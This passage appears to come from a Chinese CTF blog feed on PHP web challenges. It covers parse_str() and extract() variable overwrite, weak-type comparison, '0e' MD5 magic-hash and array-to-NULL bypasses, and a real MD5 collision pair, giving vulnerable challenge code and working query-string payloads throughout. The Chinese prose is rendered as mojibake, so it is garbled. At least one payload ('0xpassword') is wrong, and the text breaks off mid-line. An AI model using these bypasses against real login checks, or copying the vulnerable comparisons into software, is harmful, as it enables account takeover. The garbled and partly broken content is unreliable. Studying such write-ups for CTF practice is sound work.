class="headerlink" title="parse_str() ä½¿ç”¨ä¸å½“"></a>parse_str() ä½¿ç”¨ä¸å½“</h3><p><strong>parse_str(string,array)</strong> ï¼š<strong>æŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Bill&amp;age=60&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$age</span>;<br><br>output: <br>Bill <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])) &#123;<br>   <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>   <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;www.OPENCTF.com&quot;</span>;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>];<br>    @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&quot;QNKCDZO&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;QNKCDZO&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;å…¶å®å¾ˆç®€å•å…¶å®å¹¶ä¸éš¾ï¼&quot;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=a[<span class="hljs-number">0</span>]=s878926199a <br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$__</span>,<span class="hljs-variable">$___</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$__</span>==<span class="hljs-variable">$___</span>?<span class="hljs-variable">$___</span>:<span class="hljs-variable">$__</span>;<br>&#125;;<br><span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°$_ï¼Œå¯¹äºä¼ å…¥$__,$___ ä¸¤ä¸ªå‚æ•°è¿›è¡Œå¼±æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™è¿”å›$___ï¼Œä¸ç›¸ç­‰åˆ™è¿”å›$__</span><br><br><span class="hljs-variable">$$__</span>(<span class="hljs-variable">$_</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-variable">$___</span>&#125;[<span class="hljs-variable">$____</span>]&#123;<span class="hljs-variable">$_____</span>&#125;(),<span class="hljs-variable">$flag</span>));<br></code></pre></td></tr></table></figure><p>ä»¤<code>$__ == print_r</code> <code>$_($_GET&#123;$___&#125;[$____]&#123;$_____&#125;() == phpinfo()</code></p><p>phpinfo() ä¸ $flag éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œèƒ½é€šè¿‡å¼±ç±»å‹æ¯”è¾ƒã€‚</p><p>Payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?__=x&amp;x=print_r&amp;____=a&amp;_____=b&amp;___=y&amp;y[a][b]=phpinfo<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPå¼±ç±»å‹</title>
    <link href="/2023/02/02/php_weak_type/"/>
    <url>/2023/02/02/php_weak_type/</url>
    
    <content type="html"><![CDATA[<p>åˆæ˜¯è€ç”Ÿå¸¸è°ˆçš„ä¸œè¥¿äº†ï¼Œå†™æ–‡ç« ä¸»è¦æ˜¯å½’æ¡£æ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="PHPå¼±ç±»å‹"><a href="#PHPå¼±ç±»å‹" class="headerlink" title="PHPå¼±ç±»å‹"></a>PHPå¼±ç±»å‹</h2><p>PHPæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œåˆ›å»ºå˜é‡çš„æ—¶å€™ä¸éœ€è¦æ‰§è¡Œç±»å‹ã€‚ä½¿ç”¨æ—¶è‡ªåŠ¨è¯†åˆ«ã€‚</p><p>æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰æ—¶å¯ä»¥ä½¿ç”¨ <code>==</code> æˆ– <code>===</code> ï¼š</p><p><code>$a == b</code> <strong>ç­‰äºTRUE</strong>ï¼Œå¦‚æœç±»å‹è½¬æ¢å<code>$a</code>ç­‰äº<code>$b</code></p><p><code>$a === b</code> <strong>å…¨ç­‰TRUE</strong>ï¼Œå¦‚æœ<code>$a</code>ç­‰äº<code>$b</code>å¹¶ä¸”å®ƒä»¬çš„ç±»å‹ä¹Ÿç›¸ç­‰</p><p>åœ¨ç­‰äºTRUEä¸‹ä¼šè‡ªåŠ¨å‘ç”Ÿè¿™äº›è½¬æ¢ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-number">0</span> == <span class="hljs-literal">false</span><br><span class="hljs-string">&#x27;123&#x27;</span> == <span class="hljs-number">123</span><br><span class="hljs-string">&#x27;abc&#x27;</span> == <span class="hljs-number">0</span><br><span class="hljs-string">&#x27;123a&#x27;</span> = <span class="hljs-number">123</span><br><span class="hljs-string">&#x27;0x01&#x27;</span> == <span class="hljs-number">1</span><br><span class="hljs-string">&#x27;0e123456789&#x27;</span> == <span class="hljs-string">&#x27;0e987654321&#x27;</span><br>[<span class="hljs-literal">false</span>] == [<span class="hljs-number">0</span>] == [<span class="hljs-literal">NULL</span>] = [<span class="hljs-string">&#x27;&#x27;</span>]<br><span class="hljs-literal">NULL</span> == <span class="hljs-literal">false</span> == <span class="hljs-number">0</span><br><span class="hljs-literal">true</span> == <span class="hljs-number">1</span><br><span class="hljs-number">2022</span> = <span class="hljs-number">202.2e1</span> <span class="hljs-comment">//ç§‘å­¦è®¡æ•°æ³•</span><br></code></pre></td></tr></table></figure><h2 id="å¸¸è§å¥—è·¯"><a href="#å¸¸è§å¥—è·¯" class="headerlink" title="å¸¸è§å¥—è·¯"></a>å¸¸è§å¥—è·¯</h2><h3 id="å¼±ç±»å‹MD5ç¢°æ’"><a href="#å¼±ç±»å‹MD5ç¢°æ’" class="headerlink" title="å¼±ç±»å‹MD5ç¢°æ’"></a>å¼±ç±»å‹MD5ç¢°æ’</h3><p><code>0e</code> å¼€å¤´çš„å€¼åœ¨ <code>==</code> åˆ¤æ–­ç›¸ç­‰æ—¶ä¼šè¢«è§†ä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯<code>0e</code>å¼€å¤´çš„è¯ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºå®ƒä»¬ç›¸ç­‰ã€‚</p><p>å¦‚æœæ•°æ®åº“ä¸­å­˜åœ¨è¿™ç§å“ˆå¸Œå€¼ä»¥ <code>0</code> å¼€å¤´çš„å¯†ç çš„è¯ï¼Œå°±å¯ä»¥ä»¥è¿™ä¸ªç”¨æˆ·çš„èº«ä»½è½»æ˜“åœ°ç™»å½•è¿›å»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0e830400451993494058024219903391</span>QNKCDZO<span class="hljs-comment">//MD5   //åŸå€¼</span><br><span class="hljs-number">0e545993274517709034328855841020</span>s878926199a<br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜ï¼š-bugku-md5-åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#ä¾‹é¢˜ï¼š-bugku-md5-åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="ä¾‹é¢˜ï¼š bugku- md5 åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>ä¾‹é¢˜ï¼š bugku- md5 åŠ å¯†ç›¸ç­‰ç»•è¿‡</h4><p>æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå˜é‡  aï¼Œè¿™ä¸ªå˜é‡ a çš„è¦æ±‚æ˜¯ç»è¿‡ md5 åŠ å¯†ä¹‹åå’Œ â€œQNKCDZOâ€ çš„åŠ å¯†ç»“æœç›¸åŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$md51</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$md52</span> = @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;<br>      &#125; <br>      <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;<br>      &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=s878926199a<br></code></pre></td></tr></table></figure><h3 id="å…¨ç­‰MD5ç»•è¿‡"><a href="#å…¨ç­‰MD5ç»•è¿‡" class="headerlink" title="å…¨ç­‰MD5ç»•è¿‡"></a>å…¨ç­‰MD5ç»•è¿‡</h3><p>ç¬¬ä¸€ä¸ª if è¯­å¥ï¼Œå¦‚æœ username å’Œ password 2 ä¸ªå˜é‡ç›¸ç­‰ä¼šå¯¼è‡´æ— æ³•è·å¾— flagã€‚ä½†æ˜¯ç¬¬äºŒä¸ª if è¯­å¥åˆè¦æ±‚ username å˜é‡å’Œ password å˜é‡ç»è¿‡ md5() å‡½æ•°åŠ å¯†çš„ç»“æœç›¸åŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>      <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„æ­¤æ—¶é‡åˆ°çš„æ˜¯  <code>===</code> ï¼Œå¼±ç±»å‹ä¸èµ·ä½œç”¨äº†ã€‚ä¸è¿‡ md5 å‡½æ•°åœ¨ä¼ å…¥æ•°ç»„æ—¶ä¼šæŠ¥é”™è¿”å› NULL ï¼Œå½“ 2 ä¸ªå˜é‡éƒ½å¯¼è‡´æŠ¥é”™è¿”å› NULL æ—¶å°±èƒ½ä½¿ä½¿å¾—æ¡ä»¶æˆç«‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="çœŸå®MD5ç¢°æ’"><a href="#çœŸå®MD5ç¢°æ’" class="headerlink" title="çœŸå®MD5ç¢°æ’"></a>çœŸå®MD5ç¢°æ’</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>çœŸå®md5ç¢°æ’ï¼Œç”±äºstring()å‡½æ•°ï¼Œä¸èƒ½è¾“å…¥æ•°ç»„åªèƒ½è¾“å…¥å­—ç¬¦ä¸²</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2&amp;b=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2<br></code></pre></td></tr></table></figure><p>å€¼ä¸ç­‰ï¼Œmd5ç›¸ç­‰å³å¯ã€‚md5ç¢°æ’ã€‚</p><h3 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>))<br>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifè¯­å¥éœ€è¦is_numeric()åˆ¤æ–­å˜é‡ä¸æ˜¯æ•°å­—ï¼Œç¬¬äºŒä¸ªifè¯­å¥éœ€è¦$num==1ï¼Œçœ‹ä¼¼æ— è§£ä½†å¯ä»¥é€šè¿‡å¼±ç±»å‹ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">1</span>test<br></code></pre></td></tr></table></figure><h3 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h3><p>éœ€è¦ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ passwordï¼Œè¿”å› flag çš„æ¡ä»¶æ˜¯ password çš„å€¼å’Œ number å˜é‡çš„å€¼ç›¸ç­‰ã€‚ä½†æ˜¯åœ¨åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰ä¹‹å‰ï¼Œä»£ç è¦å…ˆéå† password å­—ç¬¦ä¸²ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦è½¬æ¢ä¸º ASCII åœ¨ 0 ~ 9 ä¹‹é—´å°±ä¼šè¿”å›é”™è¯¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params"><span class="hljs-variable">$temp</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br>    <span class="hljs-variable">$one</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>);    <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br>    <span class="hljs-variable">$nine</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br>    <span class="hljs-variable">$number</span> = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<br>    <span class="hljs-comment">// Check all the input characters!</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>); <span class="hljs-variable">$i</span>++)<br>    &#123;<br>          <span class="hljs-comment">// Disallow all the digits!</span><br>          <span class="hljs-variable">$digit</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$temp</span>&#123;<span class="hljs-variable">$i</span>&#125;);<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )<br>          &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>          &#125;<br>    &#125;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">noother_says_correct</span>(<span class="hljs-variable">$temp</span>);<br></code></pre></td></tr></table></figure><p>åªè¦ password çš„æ•°å€¼å’Œ number ç›¸ç­‰å³å¯ï¼Œå¯ä»¥é€šè¿‡è¿›åˆ¶è½¬æ¢æ¥ç»•è¿‡ã€‚ä¼ å…¥çš„ password æ˜¯ <code>3735929054</code> çš„å…¶ä»–è¿›åˆ¶çš„å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password = <span class="hljs-number">0</span>xpassword<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„è¿”å›-NULL-ç»•è¿‡"><a href="#æ•°ç»„è¿”å›-NULL-ç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å› NULL ç»•è¿‡"></a>æ•°ç»„è¿”å› NULL ç»•è¿‡</h3><p>ç¬¬ä¸€ä¸ª if è¯­å¥ä½¿ç”¨äº† ereg() å‡½æ•°ï¼Œç”¨äºæœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œæ•´ä¸ªè¡¨è¾¾å¼è¡¨ç¤ºåŒ¹é…ç”±å¤šä¸ªæ•°å­—å¤§å°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ç¬¬äºŒä¸ª if è¯­å¥ä½¿ç”¨äº†strpos() å‡½æ•°ï¼Œç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚å› æ­¤ä¼ å…¥çš„ password åº”è¯¥æ»¡è¶³ä»¥æ•°å­—æˆ–å­—æ¯å¼€å¤´ï¼Œä¸”å¿…é¡»åœ¨ password å‚æ•°ä¸­æ‰¾åˆ° <code>--</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">echo</span> <span 